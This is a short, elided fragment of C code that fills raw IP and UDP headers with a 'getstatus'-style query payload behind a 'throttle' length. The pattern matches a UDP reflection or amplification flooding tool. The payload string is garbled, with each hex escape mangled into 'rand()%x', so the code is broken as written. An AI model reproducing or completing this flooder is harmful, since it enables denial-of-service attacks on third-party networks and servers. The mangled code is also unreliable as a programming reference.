...
void setup_ip_header(struct iphdr *iph)
{
  ...
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + throttle;
...
void setup_udp_header(struct udphdr *udph)
{
  ...
  memcpy((void *)udph + sizeof(struct udphdr), "\rand()%xff\rand()%xff\rand()%xff\rand()%xff\rand()%x67\rand()%x65\rand()%x74\rand()%x73\rand()%x74\rand()%x61\rand()%x74\rand()%x75\rand()%x73\rand()%x0a" ,throttle);
  udph->len=htons(sizeof(struct udphdr) + throttle);
}
